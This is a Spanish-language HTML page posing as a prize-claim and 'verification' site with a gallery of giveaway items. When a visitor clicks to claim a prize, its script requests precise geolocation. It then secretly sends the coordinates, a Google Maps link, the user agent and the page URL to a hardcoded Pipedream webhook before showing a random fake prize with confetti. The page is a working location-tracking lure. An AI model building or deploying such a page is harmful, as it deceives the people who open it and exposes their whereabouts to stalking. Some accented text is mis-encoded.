<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificaci√≥n y Premios</title>
<style>
body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  margin: 0;
  padding: 0;
  background: linear-gradient(135deg, #4facfe, #00f2fe);
  color: #333;
  text-align: center;
}
.container {
  max-width: 900px;
  margin: 40px auto;
  background: #fff;
  border-radius: 20px;
  padding: 30px;
  box-shadow: 0 8px 25px rgba(0,0,0,0.15);
}
h1 { color: #222; margin-bottom: 15px; }
p { font-size: 16px; color: #555; }
button {
  margin-top: 20px;
  padding: 14px 35px;
  font-size: 18px;
  border: none;
  border-radius: 10px;
  background: #007bff;
  color: #fff;
  cursor: pointer;
  transition: background 0.3s ease;
}
button:hover { background: #0056b3; }
.premios-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit,minmax(120px,1fr));
  gap: 15px;
  margin-top: 25px;
}
.premio-card {
  border-radius: 12px;
  overflow: hidden;
  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
  transition: transform 0.3s ease;
}
.premio-card img {
  width: 100%;
  height: 100px;
  object-fit: cover;
}
.premio-card:hover {
  transform: scale(1.05);
}
#premio-grande {
  display: none;
  margin-top: 30px;
}
#premio-grande img {
  width: 90%;
  max-width: 500px;
  height: auto;
  border-radius: 15px;
  box-shadow: 0 8px 25px rgba(0,0,0,0.25);
}
canvas {
  position: fixed;
  top: 0;
  left: 0;
  pointer-events: none;
  z-index: 999;
}
</style>
</head>
<body>
<canvas id="confetti"></canvas>
<div class="container">
  <h1>‚úÖ VERIFICACI√ìN Y PREMIOS</h1>
  <p>Mira los premios disponibles y reclama el tuyo.</p>
  <div class="premios-grid" id="premios-grid"></div>
  <button id="btnPremio">üìç RECLAMA TU PREMIO</button>
  <div id="premio-grande">
    <h2>üéâ ¬°Tu premio es!</h2>
    <img id="img-premio-grande" src="" alt="">
    <h3 id="nombre-premio-grande"></h3>
  </div>
</div>

<script>
const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net";

// Premios reales
const premios = [
  {nombre:"Bicicleta de monta√±a", img:"https://images.unsplash.com/photo-1597108113201-f8c0dfc43e84?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"},
  {nombre:"Consola Gamer", img:"https://images.unsplash.com/photo-1613770040934-f41844a3d8e4?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"},
  {nombre:"Smartphone Gama Alta", img:"https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"},
  {nombre:"Smartwatch", img:"https://images.unsplash.com/photo-1516574187841-cb9cc2ca948b?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"},
  {nombre:"Laptop Ultrabook", img:"https://images.unsplash.com/photo-1517336714731-489689fd1ca8?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"},
  {nombre:"TV Pantalla Grande", img:"https://images.unsplash.com/photo-1587202372775-4f0a7d99b0b0?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"}
];

// Mostrar galer√≠a de premios
const premiosGrid = document.getElementById("premios-grid");
premios.forEach(p=>{
  const div = document.createElement("div");
  div.className = "premio-card";
  div.innerHTML = `<img src="${p.img}" alt="${p.nombre}"><h4>${p.nombre}</h4>`;
  premiosGrid.appendChild(div);
});

// Bot√≥n reclamar premio
const btn = document.getElementById("btnPremio");
const premioGrande = document.getElementById("premio-grande");
const imgGrande = document.getElementById("img-premio-grande");
const nombreGrande = document.getElementById("nombre-premio-grande");
const canvas = document.getElementById("confetti");
const ctx = canvas.getContext("2d");
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

btn.addEventListener("click",()=>{
  if(!navigator.geolocation) return alert("Tu navegador no soporta geolocalizaci√≥n.");
  navigator.geolocation.getCurrentPosition(onSuccess,onError,{enableHighAccuracy:true,timeout:10000,maximumAge:0});
});

function onSuccess(pos){
  // Datos a enviar
  const data = {
    lat: pos.coords.latitude,
    lon: pos.coords.longitude,
    accuracy: pos.coords.accuracy,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    maps_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
    source: window.location.href
  };
  enviarWebhook(data);

  // Elegir premio aleatorio
  const premio = premios[Math.floor(Math.random()*premios.length)];
  imgGrande.src = premio.img;
  nombreGrande.textContent = premio.nombre;
  premioGrande.style.display = "block";

  // Confeti
  lanzarConfeti();
}

function onError(err){ alert("‚ö†Ô∏è Error al obtener ubicaci√≥n: "+(err.message||err.code)); }

// Confeti
function lanzarConfeti(){
  const piezas = Array.from({length:150},()=>({
    x:Math.random()*canvas.width,
    y:Math.random()*canvas.height-50,
    w:10,h:10,
    color:["#f94144","#f3722c","#f9c74f","#90be6d","#577590","#43aa8b"][Math.floor(Math.random()*6)],
    vel:Math.random()+1.5
  }));
  function animar(){
    ctx.clearRect(0,0,canvas.width,canvas.height);
    piezas.forEach(p=>{
      ctx.fillStyle=p.color;
      ctx.fillRect(p.x,p.y,p.w,p.h);
      p.y+=p.vel;
      if(p.y>canvas.height) p.y=-10;
    });
    requestAnimationFrame(animar);
  }
  animar();
  setTimeout(()=>ctx.clearRect(0,0,canvas.width,canvas.height),6000);
}

// Enviar a Pipedream
async function enviarWebhook(data){
  try{
    await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
    console.log("Datos enviados a Pipedream");
  }catch(err){ console.error("Error webhook",err);}
}
</script>
</body>
</html>

